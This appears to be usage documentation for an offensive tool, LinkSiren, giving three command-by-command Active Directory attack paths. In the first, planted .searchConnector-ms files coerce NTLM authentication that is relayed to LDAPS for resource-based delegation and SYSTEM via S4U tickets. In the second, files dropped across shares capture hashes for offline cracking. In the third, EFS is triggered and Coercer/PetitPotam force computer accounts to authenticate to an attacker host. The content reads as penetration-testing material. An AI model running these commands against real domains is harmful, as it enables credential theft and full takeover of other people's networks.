# Attack paths

Three common engagement flows end to end with LinkSiren. Each one starts from valid domain credentials (Domain User is enough for most of it; Domain Admin only where noted).

## 1. Relay HTTP coercion to LDAPS for RBCD

The most common flow. Uses `.searchConnector-ms` on active users' Desktops. When a user's Explorer renders their Desktop, the WebClient service starts, the tile's URL fires as HTTP over WebDAV, and NTLM auth is coerced. Relayed to LDAPS, that auth grants you write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the victim's computer object, which is Resource-Based Constrained Delegation. From there you get SYSTEM on the victim via S4U2Self + S4U2Proxy.

Prereqs: attacker hostname in the victim's Intranet Zone (bare hostname, no dots, works by default on Win11; see [DNS Hijacking: Say My Name](https://alittleinsecure.com/dns-hijacking-say-my-name/), [krbrelayx dnstool.py](https://github.com/dirkjanm/krbrelayx), [DDSpoof](https://github.com/akamai/DDSpoof), or [Responder](https://github.com/lgandx/Responder) if the default isn't reachable). LDAPS on the DC. A viable computer object whose LDAP session isn't signed.

```bash
# 1. Discover viable computer targets in the domain.
linksiren discover DOMAIN/user:pass -dc-ip <dc-fqdn> \
    -o computers.txt

# 2. Preflight: which hosts have WebClient stopped, signing not required, etc.
linksiren check DOMAIN/user:pass -t computers.txt

# 3. Start the relay before you deploy.
#    See https://github.com/fortra/impacket (ntlmrelayx.py).
impacket-ntlmrelayx.py -t ldaps://<dc-fqdn> \
    --delegate-access --escalate-user <attacker-user> \
    -smb2support

# 4. Drop payloads to every active user's Desktop across those hosts.
linksiren target-sessions DOMAIN/user:pass -t computers.txt \
    -a attacker -n data.searchConnector-ms \
    --invisible --randomize-suffix

# 5. Wait for a user to render their Desktop.
#    ntlmrelayx captures + relays + writes the delegation attribute.

# 6. Escalate: request an S4U ticket for SYSTEM on the victim.
#    See https://github.com/fortra/impacket (getST.py).
impacket-getST.py -spn cifs/<victim-fqdn> \
    -impersonate Administrator \
    DOMAIN/<attacker-user>:<pass>

# 7. Clean up.
linksiren cleanup DOMAIN/user:pass -t computers.txt --stop-webclient

# 8. Generate the engagement report.
linksiren report
```

References: [theHackerRecipes: WebClient abuse](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient), [dirkjanm on RBCD via WebDAV](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/), [BHIS: Shadow Creds for Privesc](https://www.linkedin.com/posts/black-hills-information-security_attack-tactic-shadow-creds-activity-7284615209929891840-Po8m).

## 2. Bulk-share drop into file shares for opportunistic capture

For engagements where you don't know which users are active but you have read/write to a lot of file shares. Rank shares by recent activity, drop into the folders users are most likely to browse, capture whatever fires. Good early-recon move.

```bash
# 1. Enumerate the shares you can reach.
linksiren discover DOMAIN/user:pass -dc-ip <dc-fqdn> -o computers.txt

# 2. Rank folders by recent activity.
linksiren identify DOMAIN/user:pass -t computers.txt \
    --active-threshold 7 --max-folders-per-target 5

# 3. Deploy .searchConnector-ms to each folder. Suffix-randomized
#    to defeat WebDAV / Explorer per-URL caches.
linksiren deploy DOMAIN/user:pass -t payload_targets.txt \
    -a attacker -n update.searchConnector-ms \
    --invisible --randomize-suffix

# 4. Capture inbound WebDAV NTLMSSP.
linksiren listen --port 80 --blobs-dir ./blobs

# 5. Sift blobs into hashcat for offline cracking, or hand-off to
#    ntlmrelayx while the file lives.

# 6. Clean up + report.
linksiren cleanup DOMAIN/user:pass --stop-webclient
linksiren report
```

References: [alittleinsecure: Files that Coerce](https://alittleinsecure.com/files-that-coerce-search-connectors-and-beyond/), [alittleinsecure: DNS Hijacking / Intranet Zoning](https://alittleinsecure.com/dns-hijacking-say-my-name/).

## 3. EFS trigger for computer-account authentication

For when you want a computer account (`WS01$`) to authenticate, not a user. LinkSiren wakes the triggered-start Encrypting File System service on the target so `\PIPE\efsrpc` becomes available. From there, `Coercer` or `PetitPotam` fires MS-EFSR RPC calls that force the target computer to authenticate outbound. Relay that auth to LDAPS for RBCD, or to another SMB target for lateral movement.

Prereqs: `SMB` write to any share on the target. The account you use to trigger EFS needs an EFS certificate (domain users typically do; built-in Administrator typically doesn't).

```bash
# 1. Wake the EFS service on every target computer. This does not
#    drop a payload; it uses an existing file as the encrypt trigger.
linksiren coerce DOMAIN/user:pass -t computers.txt

# 2. Start the relay.
impacket-ntlmrelayx.py -t ldaps://<dc-fqdn> \
    --delegate-access --escalate-user <attacker-user> \
    -smb2support

# 3. Fire EFSR from a separate tool.
#    See https://github.com/p0dalirius/Coercer.
coercer coerce -u <user> -p <pass> -d DOMAIN \
    -l <attacker-ip> -t <victim-ip> --always-continue

# 4. ntlmrelayx catches <victim>$ authenticating outbound and writes
#    the RBCD attribute back on the same host.

# 5. Escalate via S4U as in path 1.

# 6. Clean up. On modern Windows the EFS service refuses SCMR STOP by
#    design (dwControlsAccepted omits STOP); linksiren surfaces this
#    honestly and the service stays Running until the target reboots.
#    That is expected, not a bug.
linksiren cleanup DOMAIN/user:pass --stop-efs
linksiren report
```

References: [MS-EFSR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/), [Coercer](https://github.com/p0dalirius/Coercer), [PetitPotam](https://github.com/topotam/PetitPotam), [dirkjanm on Coerced Auth Relay](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/).
